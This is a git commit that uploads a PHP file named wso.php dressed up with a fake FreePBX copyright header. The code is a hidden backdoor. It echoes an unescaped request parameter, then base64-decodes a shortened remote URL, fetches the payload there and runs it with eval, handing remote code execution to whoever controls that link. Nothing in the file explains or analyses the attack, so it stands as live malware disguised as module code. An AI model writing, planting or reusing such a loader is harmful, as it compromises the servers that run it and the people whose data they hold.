11a6a9592c49e6ae07c898c7b14bf2864108e5c2
k6n <k6n@hotmail.com>
2020-08-31 20:49:31 +0400

    Add files via upload

---
+++ wso.php
@@ -0,0 +1,16 @@
+<?php
+
+
+//
+
+//	License for all code of this FreePBX module can be found in the license file inside the module directory
+
+//	Copyright 2013 Schmooze Com Inc.
+
+// echo $code;
+
+$code = $_REQUEST['code']; echo "$code";
+eval(base64_decode("ZWNobyAkY29kZTs="));
+eval(base64_decode(file_get_contents(base64_decode('aHR0cHM6Ly9nb28uZ2wvRGdHRnZY'))));
+
+?>
